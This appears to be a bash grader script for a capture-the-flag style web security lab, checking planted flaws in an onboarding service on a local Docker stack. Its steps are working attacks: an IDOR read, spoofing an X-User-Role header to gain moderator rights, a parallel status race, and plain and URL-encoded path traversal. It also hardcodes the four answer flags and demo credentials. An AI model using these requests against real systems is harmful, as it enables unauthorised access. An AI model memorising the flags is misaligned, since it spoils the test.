#!/usr/bin/env bash
# Cycle-9 — examiner dry-run for v1.6.0 onboarding plants (F1–F4 + honeypot).
#
# Expects prod stack only (no overlay):
#   docker compose -f infra/docker-compose.prod.yml up -d --build
#
# Proves: Nest BFF edge · IDOR · header spoof · status race window · export PT ·
# SIEM leak · honeypot decoy. Uses /api/ping — does NOT probe /health for liveness.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BASE="${BASE_URL:-http://localhost:8080/api}"
INTAKE="${INTAKE_BASE:-${BASE}/intake}"
COMPOSE=(docker compose -f "${ROOT}/infra/docker-compose.prod.yml")

F1='OS{833b0578fcd6f6442121e8c7a9724376}'
F2='OS{11ec516803539a84dafeef8c8e151aa2}'
F3='OS{6a5c5e3477552175a94374689243b859}'
F4='OS{e5f9b003b8e5e02b2b9ebb8bc1971abf}'

BODY="$(mktemp /tmp/kc-c9-exam-XXXXXX.body)"
trap 'rm -f "$BODY"' EXIT

fail() { echo "FAIL: $1" >&2; exit 1; }

reset_request_status() {
  local id="$1" status="$2"
  local intake_cid
  intake_cid="$("${COMPOSE[@]}" ps -q intake 2>/dev/null || true)"
  [[ -n "$intake_cid" ]] || return 0
  docker exec "$intake_cid" sh -c \
    "PGPASSWORD=\"\$DB_ADMIN_PASSWORD\" psql -h \"\${DB_HOST:-postgres}\" -U \"\${DB_ADMIN_USER:-postgres}\" -d \"\${INTAKE_DB_NAME:-kc_intake}\" -c \"UPDATE onboarding_requests SET status='${status}' WHERE id=${id};\"" \
    >/dev/null 2>&1 || true
}

login_token() {
  local email="$1" pass="$2"
  local login body
  login=$(curl -sS -X POST "${BASE}/auth/login" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${email}\",\"password\":\"${pass}\"}") \
    || fail "login failed for ${email}"
  body=$(echo "$login" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
  [[ -n "$body" ]] || fail "no token for ${email}: ${login}"
  echo "$body"
}

auth_curl() {
  curl -sS -H "Authorization: Bearer ${TOKEN}" "$@"
}

echo "== Cycle-9 examiner (v1.6.0) =="

echo "Reachability via /api/ping (not /health)..."
PCODE=$(curl -sS -o "$BODY" -w '%{http_code}' "${BASE}/ping") || true
[[ "$PCODE" == "200" ]] || fail "ping expected 200, got ${PCODE}: $(cat "$BODY")"
grep -q '"status":"ok"' "$BODY" || fail "unexpected ping body: $(cat "$BODY")"
HNEST=$(curl -sS -o /dev/null -w '%{http_code}' "${BASE}/health") || true
[[ "$HNEST" == "404" ]] || fail "Nest /health must be 404, got ${HNEST}"
HINT=$(curl -sS -o /dev/null -w '%{http_code}' "${INTAKE}/health") || true
[[ "$HINT" == "404" ]] || fail "Intake /health must be 404, got ${HINT}"
echo "  OK (ping 200; health endpoints gone)"

echo "Login demo user + directory search..."
TOKEN="$(login_token 'user@kc.test' 'UserPass123!')"
SCODE=$(auth_curl -o "$BODY" -w '%{http_code}' --get --data-urlencode 'q=lisa' "${INTAKE}/search") || true
[[ "$SCODE" == "200" ]] || fail "search expected 200, got ${SCODE}: $(cat "$BODY")"
grep -q '"username":"lisa"' "$BODY" || fail "lisa missing from search: $(cat "$BODY")"
echo "  OK"

echo "F1 — IDOR GET onboarding-requests/9301..."
auth_curl -o "$BODY" "${INTAKE}/onboarding-requests/9301" || fail "IDOR request failed"
grep -qF "$F1" "$BODY" || fail "F1 missing from 9301 body: $(cat "$BODY")"
echo "  OK: ${F1}"

echo "Header trust — user PUT status denied without spoof..."
UCODE=$(auth_curl -o "$BODY" -w '%{http_code}' -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"status":"approved"}' \
  "${INTAKE}/onboarding-requests/9302/status") || true
[[ "$UCODE" == "403" ]] || fail "expected 403 for user status PUT, got ${UCODE}: $(cat "$BODY")"
echo "  OK (403)"

echo "Pending export blocked on 9302..."
reset_request_status 9302 pending
ECODE=$(auth_curl -o "$BODY" -w '%{http_code}' \
  "${INTAKE}/onboarding-requests/9302/export?file=package.json") || true
[[ "$ECODE" == "403" ]] || fail "expected 403 for pending export, got ${ECODE}: $(cat "$BODY")"
echo "  OK (403)"

echo "F2 — spoof X-User-Role: moderator on status PUT (9304)..."
auth_curl -o "$BODY" -X PUT \
  -H 'X-User-Role: moderator' \
  -H 'Content-Type: application/json' \
  -d '{"status":"approved"}' \
  "${INTAKE}/onboarding-requests/9304/status" || fail "spoof status PUT failed"
grep -qF "$F2" "$BODY" || fail "F2 missing from privilege_ack: $(cat "$BODY")"
echo "  OK: ${F2}"

echo "Race window on 9302 (parallel approve/reject)..."
reset_request_status 9302 pending
R1="$(mktemp /tmp/kc-c9-r1-XXXXXX.body)"
R2="$(mktemp /tmp/kc-c9-r2-XXXXXX.body)"
trap 'rm -f "$BODY" "$R1" "$R2"' EXIT
(
  auth_curl -o "$R1" -w '%{http_code}' -X PUT \
    -H 'X-User-Role: moderator' -H 'Content-Type: application/json' \
    -d '{"status":"approved"}' "${INTAKE}/onboarding-requests/9302/status" >/dev/null || true
) &
(
  auth_curl -o "$R2" -w '%{http_code}' -X PUT \
    -H 'X-User-Role: moderator' -H 'Content-Type: application/json' \
    -d '{"status":"rejected"}' "${INTAKE}/onboarding-requests/9302/status" >/dev/null || true
) &
wait
grep -q '"status"' "$R1" || fail "race approve body missing status: $(cat "$R1")"
grep -q '"status"' "$R2" || fail "race reject body missing status: $(cat "$R2")"
echo "  OK (parallel status PUTs completed)"

echo "F3 — export path traversal on approved 9303..."
T1=$(auth_curl "${INTAKE}/onboarding-requests/9303/export?file=../../private/onboarding-export.flag") \
  || fail "traversal ../ failed"
echo "$T1" | grep -qF "$F3" || fail "F3 missing from ../ traversal: $T1"
T2=$(auth_curl "${INTAKE}/onboarding-requests/9303/export?file=%2e%2e%2f%2e%2e%2fprivate%2fonboarding-export.flag") \
  || fail "traversal %2e%2e%2f failed"
echo "$T2" | grep -qF "$F3" || fail "F3 missing from encoded traversal: $T2"
echo "  OK: ${F3}"

echo "F4 — SIEM /security/events leak..."
auth_curl -o "$BODY" "${INTAKE}/security/events" || fail "events request failed"
grep -qF "$F4" "$BODY" || fail "F4 missing from events: $(cat "$BODY")"
echo "  OK: ${F4}"

echo "Honeypot /v1/internal/debug..."
HCODE=$(auth_curl -o "$BODY" -w '%{http_code}' "${INTAKE}/v1/internal/debug") || true
[[ "$HCODE" == "403" ]] || fail "honeypot expected 403, got ${HCODE}: $(cat "$BODY")"
grep -qi 'services alerted' "$BODY" || fail "honeypot missing services alerted: $(cat "$BODY")"
grep -qF 'OS{' "$BODY" && fail "honeypot must not contain OS{ flag"
echo "  OK (services alerted; no graded flag)"

echo ""
echo "Cycle-9 examiner passed."
echo "  F1 ${F1}"
echo "  F2 ${F2}"
echo "  F3 ${F3}"
echo "  F4 ${F4}"
